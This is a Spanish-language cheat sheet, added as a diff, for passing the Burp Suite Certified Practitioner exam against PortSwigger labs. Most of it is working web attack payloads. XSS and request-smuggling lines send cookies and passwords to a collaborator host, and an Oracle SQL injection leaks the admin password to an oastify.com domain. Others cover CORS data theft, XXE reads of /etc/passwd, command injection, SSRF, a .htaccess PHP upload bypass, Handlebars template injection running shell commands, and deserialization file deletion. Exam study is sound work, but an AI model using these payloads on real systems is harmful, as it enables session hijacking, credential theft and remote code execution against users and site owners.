@@ -1,0 +1,265 @@
+Puede que sirva de ayuda --> https://bscpcheatsheet.gitbook.io/exam
+
+/-/-/-/-/ SCAN /-/-/-/-/
+
+Scaneamos en un punto, vemos que hay un xxe
+Pegamos este payload en el campo vulnerable -->
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+Escaneamos todas las partes de la cookie 
+Si scan me dice que hay XSS
+
+cookie='"><svg/onload%3dfetch(`//COLLABORATOR/?sex=${encodeURIComponent(document.cookie)}`)>%253aiada0Ru6dylR0hX7VqpLphKwaXwK4LT7
+cookie='"><svg/onload%3dfetch(`//COLLABORATOR/${encodeURIComponent(document.cookie)}`)>%3a3aiada0Ru6dylR0hX7VqpLphKwaXwK4LT7
+cookie='"><svg/onload%3dfetch(`//COLLABORATOR/${encodeURIComponent(document.cookie)}`)>:3aiada0Ru6dylR0hX7VqpLphKwaXwK4LT7
+cookie='"><svg/onload%3dfetch(`//COLLABORATOR/${encodeURIComponent(document.cookie)}`)>%253aiada0Ru6dylR0hX7VqpLphKwaXwK4LT7 --> resto de la cookie
+Pegamos cookie entera que devuelva collaborator
+
+/-/-/-/-/ XSS /-/-/-/-/
+
+Paso Scan en Comments
+
+<script> fetch('https://COLLABORATOR', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>
+^ robar cookie si alguien visita un blog poner en comments ^
+
+
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://Collaborator',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+^ robar password si alguien mete datos en comments ^
+
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')"></iframe> 
+^ Nos fijamos en Source Code el DOM acepta mensajes con la cadena http  ^
+
+
+/-/-/-/-/ SQLI /-/-/-/-/
+
+Scan a todas las cookies, CAMBIAR  LOS USERS Y  TABLAS si son diferentes
+TrackingID=sdsddds'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.6iplkkb46lyvk8gwvisoy7314sajycm1.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual-- 
+
+Si hay XML en stock check, storeID>1+4 </storeID   (sumo o resto los valores)
+Hackvertor --> encode hex_entities o dec_entities y pruebo --> UNION SELECT table_name from information_schema.tables
+<@hex_entities>UNION SELECT concat(username,' < > ',password) FROM users</@hex_entities>
+
+/-/-/-/-/ ACCESS CONTROL /-/-/-/-/
+
+Probar con un user y password legits Alternando con peticiones non legit
+
+peter wiener
+
+carlos adobe
+
+peter wiener
+
+carlos contrasena
+
+/-/-/-/-/ AUTHENTICATION /-/-/-/-/
+
+Poner exactamente las cifras en intruder, 
+Por ejemplo si el código a reventar es de 4 dígitos --> max & minimum 4 digits
+
+Probar acciones como action-user=upgrade
+con cookie de wiener y NO de ADMIN
+
+Entro con stay-logged-in
+Decodeamos la cookie y sale el user
+Get /my-account --> intruder
+añado a variable stay-logged-in=§§
+payload processing --> md5 --> add prefix= carlos: --> encode BASE64
+añado grep match= carlos
+o cualquier cadena que haya en el my-account una vez ya loegados (fijarme cuando estoy logeado con wiener que cadenas hay)
+
+/-/-/-/-/ COMMAND INJECTION /-/-/-/-/
+
+Probar todos los parámetros injectables aunque SCAN diga otro diferente 
+Veo si hay un directorio donde se escriba
+||whoami>/var/www/images/whoami.txt||
+lo consulto a través de un filename
+filename=whoami.txt
+
+
+
+/-/-/-/-/ SSRF /-/-/-/-/
+
+stockApi=http://127.1/%25%36%31dmin --> dobleencode 2 veces la a en DECODER
+
+donde haya un campo path=
+intentar ir a algún lado de la web, si es vulnerable, lopegamos a stockApi=
+algunos campos no los detecta bien  
+stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
+
+/-/-/-/-/ File Upload /-/-/-/-/
+
+puedo subir un fichero .htaccess
+edito las líneas siguientes líneas 
+
+> Content-type: plain/text
+
+> AddType application/x-httpd-php .sex --> extensión inventada
+
+hago un payload en php y lo llamo payload.sex
+busco dónde consultar ese archivo para que me de la solución
+
+/-/-/-/-/ Host Header Attack /-/-/-/-/
+
+pruebo
+/admin
+Host: collaborator
+
+Voy a intruder --> quito Update Host Header
+
+GET https://lab/admin
+Host: 192.168.0.§§
+
+/-/-/-/-/ CSRF /-/-/-/-/
+
+2. change request method --> engagement tools --> CSRF normal y quitar token, con method a GET
+
+/-/-/-/-/ Java serialized /-/-/-/-/
+
+Nos damos cuenta de las funciones que hay
+un botón que deletea una imagen, cambniamos esa imagen por /home/carlos/morale.txt
+encode base64 --> O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"ww3sjbpw5ajq9c3rph9le5xlmnty0h3c";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
+al lanzar la request deletea el archivo
+
+
+/-/-/-/-/ WEB CACHE POISONING /-/-/-/-/
+
+Buscar el Js donde nos responde con un 302 y un Location: serverexploit/tracking/tracking.js DESPUÉS DE PONERLE LO SIGUIENTE
+x-Forwarded-Scheme: http
+x-Forwarded-Host: exploitserver.com
+AQUÍ SÓLO TIENE QUE HABER UN SALTO DE LÍNEA
+
+en el server exploit 
+serverexploit/tracking/tracking.js 
+body:
+alert(document.cookie)
+
+/-/-/-/-/ CORS /-/-/-/-/
+
+Origin: página vulnerable (escaneamos página de stock) --> esto no funcionó en los labs
+
+<script>
+    document.location="http://stock.0a5800b1030e30de81d95d500009000c.web-security-academy.net/?productId=1<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a5800b1030e30de81d95d500009000c.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a1300d903183078814d5c8d012800fb.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+
+/-/-/-/-/ SSTI /-/-/-/-/
+https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+
+Identifico plantilla HANDLEBARS nodeJS con intruder
+ENcodeo lo siguiente en URL y lo mando  --> no pinta la salida de los comandos, 
+
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').exec('whoami');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+
+/-/-/-/-/ Clickjacking   /-/-/-/-/
+
+<style>
+	iframe {
+		position:relative;
+		width:1000px;
+		height: 700px;
+		opacity: 0.8;
+		z-index: 2;
+	}
+   .firstClick, .secondClick {
+		position:absolute;
+		top:515px;
+		left:55px;
+		z-index: 1;
+	}
+   .secondClick {
+		top:314px;
+		left:211px;
+	}
+</style>
+<div class="firstClick">Click me first</div>
+<div class="secondClick">Click me next</div>
+<iframe src="https://lab/my-account"></iframe>
+
+/-/-/-/-/ OAUTH /-/-/-/-/
+
+Me logeo con redes sociales
+Intercept On --> cuando llegue a --> https://lab.net/oauth-linking?code=asesed 
+copio URL y dropeo petición
+en EXPLOIT SERVER --> <iframe src="UrlCopiada"></iframe>
+Mando a la víctima
+logout
+Me vuelvo a logear con redes sociales
+
+/-/-/-/-/ Information Disclosure /-/-/-/-/
+
+crawl web hasta encontrar --> https://lab.net/.git
+wget -r https://lab.net/.git
+Saco git-cola pincho en los archivos
+Commit --> ammend last commit
+
+/-/-/-/-/ Web Socket /-/-/-/-/
+
+Intercept On --< mandamos a Repeater la petición de message
+Debemos pegar la línea debajo de host:
+Peldaño deslizable en repeater --> X-Forwarded-For: 1.1.1.1 --> Recconect --> lápiz --> attach
+{"message":"<img src=1 oNeRrOr=alert`1`>"}
+
+/-/-/-/-/ SMUGLING /-/-/-/-/
+
+El 1º content-lenght se cambia sólo, el 2º sumo los bytes una petición a / normal con ctrl +a
+pongo el comment lo último
+sumo petición + body desde csrf hasta comment=sexo
+voy sumando el 2º lenght hasta q veo la cookie de la víctima en el comentario correspondiente
+Tirar una request legit a /
+
+Content-Length: 285
+Transfer-Encoding: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Cookie: session=0IwQ8pcLZxIbFJg173HpbrR6gqmpDiCJ
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 970
+
+csrf=9AmnZ8oCpeXZxOM4C1CoqXVMQLSGQG2e&postId=1&name=unbesoo&email=quiero%40queme.beses&website=http%3A%2F%2Fhola.com&comment=sexo
+
+
+
+SCANNER no saca xss
+primero probar si la petición se smugglea
+ir probando poco a poco
+
+POST / HTTP/1.1 --> probar http/2 
+Host: lab.net
+Content-Length: 243 --> se cambia solo , NO DAR OPCIÓN UPDATE CL
+Transfer-Encoding: chunked
+
+0
+
+GET /post?postId=5 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+User-Agent: focas"/><script>document.location='http://COLLABORATOR/?c='+document.cookie</script>
+
+x=1
+0
+
+
